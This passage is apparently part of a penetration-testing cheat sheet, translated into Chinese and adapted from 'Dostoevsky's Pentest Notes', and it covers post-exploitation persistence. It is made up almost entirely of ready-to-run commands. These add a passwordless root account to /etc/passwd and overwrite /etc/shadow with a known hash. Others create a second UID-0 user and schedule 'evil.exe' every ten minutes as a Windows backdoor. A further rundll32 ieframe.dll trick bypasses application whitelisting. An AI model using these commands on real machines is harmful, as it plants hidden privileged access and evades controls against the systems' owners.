```text
echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd

# 很少需要，但是如果您需要通过使用useradd和passwd向先前创建的用户添加密码，则不工作。Pwd是“kali
sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
```

#### 创建另一个root用户

```text
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
```

#### 生成OpenSSL密码

```text
openssl passwd -1 password 
# output $1$YKbEkrkZ$7Iy/M3exliD/yJfJVeTn5.
```

#### 持续的后门

```text
# Launch evil.exe every 10 minutes
schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
```

### 代码执行/应用程序白名单绕过

#### Ieframe.dll

{% tabs %} {% tab title="cmd" %}

```text
rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
```

{% endtab %}

{% tab title="test.url" %}

```text
[internetshortcut]
url=c:\windows\system32\calc.exe
```

{% endtab %} {% endtabs %}

This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).  


